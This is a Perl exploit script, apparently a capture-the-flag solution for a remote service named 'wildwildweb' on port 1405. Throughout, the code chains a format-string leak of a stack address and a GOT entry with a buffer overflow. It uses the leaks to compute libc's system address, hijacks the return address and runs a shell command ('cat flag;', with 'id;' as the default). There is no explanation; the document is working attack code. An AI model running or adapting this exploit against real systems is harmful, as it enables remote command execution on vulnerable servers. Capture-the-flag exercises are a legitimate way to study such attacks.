#!/usr/bin/env perl
use IO::Socket;

$|++;

$OFFSET_GOT = 0x100;
$OFFSET_SYSTEM = 0xa5c20;


my $sock = undef;

sub open_sock
{
    $sock = new IO::Socket::INET(
        PeerAddr => 'wildwildweb.fluxfingers.net', # '127.0.0.1',
        PeerPort => 1405, # 13368,
        Proto => 'tcp'
    ) or die 'no connection :(', $/;
}

sub read_until
{
    my $until = shift;
    my $ret = '';

    while (1) {
        # select undef, undef, undef, 0.1;
        sysread $sock, $tmp, 1024, 0;
        $ret .= $tmp;
        return $ret if $ret =~ /$until/;
    }
}

sub reconnect
{
    open_sock();
    read_until("Your choice: ");
}

sub overflow
{
    $rip = shift || "";
    $arg1 = shift || "";
    $arg2 = shift || "";

    print $sock "1";
    read_until("Code");

    print $sock "A"x20;
    read_until("Your choice: ");

    print $sock "2";
    read_until("Age: ");

    $payload = "$arg2\n";
    if (length($rip) eq 0) {
        $payload .= "B"x(27-length($payload)-7);
    } else {
        $payload .= "B"x(27-length($payload)-8);
        $payload .= substr $rip, 0, 6;
        $payload .= "\x01";
        $payload .= "\x00";
    }

    print $sock "$payload";

    read_until("Name: ");

    $payload = $arg1 . " ";
    $payload .= "C"x(27-length($payload));
    print $sock "$payload";
}

sub leak_stack
{
    $pos = shift || "1";

    reconnect();

    overflow("", "s %$pos\$016llx", "40");

    $data = read_until("s ");
    $data =~ /s (.{16})/;

    return hex($1);
}

sub leak
{
    $addr = shift || return 0;

    reconnect();

    overflow("", "s %s ", sprintf("%d", $addr));

    $data = read_until("s ");
    $data =~ /s ([^\s]*) /;

    $packed = $1 . "\x00"x(8-length($1));

    unpack("Q", $packed);
}

sub run_cmd
{
    $rip = shift || return 0;
    $cmd = shift || "id; ";

    reconnect();

    overflow(pack("Q", $rip), $cmd, "40");
}

$image_addr = leak_stack("2");
printf "[+] leak image address... 0x%016llx\n", $image_addr;

$open_got = leak($image_addr - $OFFSET_GOT);
printf "[+] leak open\@got... 0x%016llx\n", $open_got;

$system_libc = $open_got - $OFFSET_SYSTEM;
printf "[+] system at... 0x%016llx\n", $system_libc;

printf "[+] flag: ";
run_cmd($system_libc, "cat flag; ");
$data = read_until("flag");
$data =~ /(flag{.*})/;

print $1, $/;

close $sock;
